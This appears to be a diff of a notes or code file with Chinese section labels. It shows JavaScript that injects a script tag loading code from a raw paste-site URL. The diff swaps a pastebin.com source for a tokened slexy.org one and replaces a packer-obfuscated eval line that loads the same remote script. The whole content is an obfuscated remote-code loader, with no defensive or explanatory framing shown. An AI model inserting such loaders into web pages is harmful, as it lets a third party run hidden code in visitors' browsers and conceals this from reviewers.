@@ -367,9 +367,10 @@ new：
  var script=document.createElement('script');
  script.type="text/javascript";
  script.src="https://pastebin.com/raw/rcpymHqy";
+ script.src="https://slexy.org/raw/s2O561RSPI?token=bbc23e3202587a88f6794fb0ecf2fac5dc898b567231ca0e4c6fbdfb2b94ff46&ts=1585839174";
  document.body.appendChild(script);
 
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}(' e a=4.3(\'a\'); a.d="c/6"; a.b="5://7.2/8/9"; 4.1.0(a);',62,15,'appendChild|body|com|createElement|document|https|javascript|pastebin|raw|rcpymHqy|script|src|text|type|var'.split('|'),0,{}))
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}(' i b=5.4(\'b\'); b.h="e/7"; b.d="6://c.8/9/a?f=2&g=0"; 5.3.1(b);',62,19,'1585839174|appendChild|bbc23e3202587a88f6794fb0ecf2fac5dc898b567231ca0e4c6fbdfb2b94ff46|body|createElement|document|https|javascript|org|raw|s2O561RSPI|script|slexy|src|text|token|ts|type|var'.split('|'),0,{}))
 
 
 测试：
